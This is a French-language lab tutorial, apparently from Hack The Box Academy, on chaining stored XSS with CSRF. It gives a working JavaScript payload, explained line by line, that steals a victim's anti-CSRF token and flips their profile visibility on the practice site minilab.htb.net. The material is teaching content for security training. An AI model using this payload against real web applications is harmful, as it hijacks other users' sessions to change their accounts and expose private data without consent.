Chaînage XSS et CSRF
====================

* * * * *

Parfois, même si nous parvenons à contourner les protections CSRF, nous ne pourrons peut-être pas créer de requêtes intersites en raison d'une sorte de restriction de même origine/même site. Si tel est le cas, nous pouvons essayer de chaîner les vulnérabilités pour obtenir le résultat final de CSRF.

Laissez-nous vous donner un exemple pratique.

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'application cible et suivez-la. N'oubliez pas de configurer le vhost ( `minilab.htb.net`) spécifié pour accéder à l'application.

Accédez `http://minilab.htb.net`à l'application et connectez-vous à l'aide des informations d'identification ci-dessous :

-   Courriel : crazygorilla983
-   Mot de passe : poissons

Il s'agit d'un compte que nous avons créé pour examiner les fonctionnalités de l'application.

Quelques faits sur l'application:

-   L'application propose les mêmes protections d'origine/de même site que les mesures anti-CSRF (via une configuration de serveur - vous ne pourrez pas réellement la repérer)
-   Le champ *Pays* de l'application est vulnérable aux attaques XSS stockées (comme nous l'avons vu dans la section *Cross-Site Scripting (XSS)* )

Les demandes intersites malveillantes sont hors de l'équation en raison des protections de la même origine/du même site. Nous pouvons toujours effectuer une attaque CSRF via la vulnérabilité XSS stockée qui existe. Plus précisément, nous tirerons parti de la vulnérabilité XSS stockée pour émettre une demande de changement d'état contre l'application Web. Une requête via XSS contournera toute protection de même origine/même site puisqu'elle dérivera du même domaine !

Il est maintenant temps de développer la charge utile JavaScript appropriée à placer dans le champ *Pays* du profil d'Ela Stienen.

Ciblons la demande *de changement de visibilité* car une attaque CSRF réussie ciblant *le changement de visibilité* peut entraîner la divulgation d'un profil privé.

Tout d'abord, nous devons intercepter la requête associée.

Exécutez Burp Suite comme suit.

```
dsgsec@htb[/htb]$ burpsuite

```

En parcourant l'application, on s'aperçoit qu'Ela Stienen ne peut pas partager son profil. C'est parce que son profil est *privé* . Changeons cela en cliquant sur "Modifier la visibilité".

Ensuite, activez le proxy de Burp Suite ( *Intercept On* ) et configurez votre navigateur pour le parcourir. Cliquez maintenant sur *Rendre public ! *.

![image](https://academy.hackthebox.com/storage/modules/153/45.png)

Vous devriez voir ci-dessous dans le proxy de Burp Suite.

![image](https://academy.hackthebox.com/storage/modules/153/56.png)

Transférez toutes les demandes afin que le profil d'Ela Stienen devienne public.

Concentrons-nous sur la charge utile que nous devons spécifier dans le champ *Pays* du profil d'Ela Stienen pour exécuter avec succès une attaque CSRF qui modifiera les paramètres de visibilité de la victime (de privé à public et vice versa).

La charge utile que nous devons spécifier peut être vue ci-dessous.

Code : javascript

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>

```

Laissez-nous décomposer les choses pour vous.

Tout d'abord, nous mettons le script entier dans `<script>`des balises, afin qu'il soit exécuté en tant que JavaScript valide ; sinon, il sera rendu sous forme de texte.

Code : javascript

```
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();

```

L'extrait de script ci-dessus crée un ObjectVariable appelé *req* , que nous utiliserons pour générer une requête. *var req = new XMLHttpRequest(); *nous permet de nous préparer à envoyer des requêtes HTTP.

Code : javascript

```
req.onload = handleResponse;

```

Dans l'extrait de script ci-dessus, nous voyons le gestionnaire d'événements *onload* , qui effectuera une action une fois la page chargée. Cette action sera liée à la fonction *handleResponse* que nous définirons plus tard.

Code : javascript

```
req.open('get','/app/change-visibility',true);

```

Dans l'extrait de script ci-dessus, nous passons trois arguments. *get* qui est la méthode de requête, le chemin ciblé */app/change-visibility* puis *true* qui continuera l'exécution.

Code : javascript

```
req.send();

```

L'extrait de script ci-dessus enverra tout ce que nous avons construit dans la requête HTTP.

Code : javascript

```
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};

```

L'extrait de script ci-dessus définit une fonction appelée *handleResponse* .

Code : javascript

```
var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];

```

L'extrait de script ci-dessus définit une variable appelée *token* , qui obtient la valeur de *responseText* à partir de la page que nous avons spécifiée précédemment dans notre requête. `/name="csrf" type="hidden" value="(\w+)"/)[1];`recherche un champ de saisie caché appelé *csrf* et \w+ correspond à un ou plusieurs caractères alphanumériques. Dans certains cas, cela peut être différent, alors regardons comment vous pouvez identifier le nom d'une valeur cachée ou vérifier s'il s'agit bien de "CSRF".

Ouvrez les outils de développement Web (Maj+Ctrl+I dans le cas de Firefox) et accédez à l' onglet *Inspecteur* . Nous pouvons utiliser la fonctionnalité *de recherche* pour rechercher une chaîne spécifique. Dans notre cas, nous recherchons *csrf* et nous obtenons un résultat.

![image](https://academy.hackthebox.com/storage/modules/153/57.png)

Remarque : Si aucun résultat n'est renvoyé et que vous êtes certain que les jetons CSRF sont en place, parcourez divers éléments du code source ou copiez votre jeton CSRF actuel et recherchez-le via la fonctionnalité de recherche. De cette façon, vous pouvez découvrir le nom du champ de saisie que vous recherchez. Si vous n'obtenez toujours aucun résultat, cela ne signifie pas que l'application n'utilise aucune protection anti-CSRF. Il pourrait y avoir un autre formulaire protégé par une protection anti-CSRF.

Code : javascript

```
var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');

```

L'extrait de script ci-dessus construit la requête HTTP que nous enverrons via un objet [XMLHttpRequest .](https://blog.0daylabs.com/2014/09/13/ajax-everything-you-should-know-about-xmlhttprequest/)

Code : javascript

```
changeReq.open('post', '/app/change-visibility', true);

```

Dans l'extrait de script ci-dessus, nous changeons la méthode de GET à POST. La première demande était de nous déplacer vers la page ciblée et la deuxième demande était d'effectuer l'action souhaitée.

Code : javascript

```
changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

```

L'extrait de script ci-dessus définit le Content-Type sur *application/x-www-form-urlencoded* .

Code : javascript

```
changeReq.send('csrf='+token+'&action=change');

```

L'extrait de script ci-dessus envoie la requête avec un paramètre appelé *csrf* ayant la valeur de la variable *de jeton* , qui est essentiellement le jeton CSRF de la victime, et un autre paramètre appelé *action* avec la valeur *change* . Ce sont les deux paramètres que nous avons remarqués lors de l'inspection de la requête ciblée via Burp.

![image](https://academy.hackthebox.com/storage/modules/153/56.png)

Essayons de rendre public le profil d'une victime.

Tout d'abord, soumettez la charge utile complète dans le champ *Pays* du profil d'Ela Stienen et cliquez sur "Enregistrer".

![image](https://academy.hackthebox.com/storage/modules/153/44.png)

Ouvrez un `New Private Window`, accédez à `http://minilab.htb.net`nouveau et connectez-vous à l'application à l'aide des informations d'identification ci-dessous :

-   Courriel : goldenpeacock467
-   Mot de passe : topcat

Il s'agit d'un utilisateur qui a son profil "privé". Aucune fonctionnalité "Partager" n'existe.

![image](https://academy.hackthebox.com/storage/modules/153/58.png)

Ouvrez un nouvel onglet et parcourez le profil public d'Ela Stienen en accédant au lien ci-dessous.

`http://minilab.htb.net/profile?email=ela.stienen@example.com`

C'est ce que la victime rencontrera.

![image](https://academy.hackthebox.com/storage/modules/153/46.png)

Maintenant, si vous revenez à la page de profil habituelle de la victime et que vous actualisez/rechargez la page, vous devriez voir que son profil est devenu "public" (notez le bouton "Partager" qui est apparu).

![image](https://academy.hackthebox.com/storage/modules/153/59.png)

Vous venez d'exécuter une attaque CSRF via XSS, en contournant les protections de même origine/même site en place !
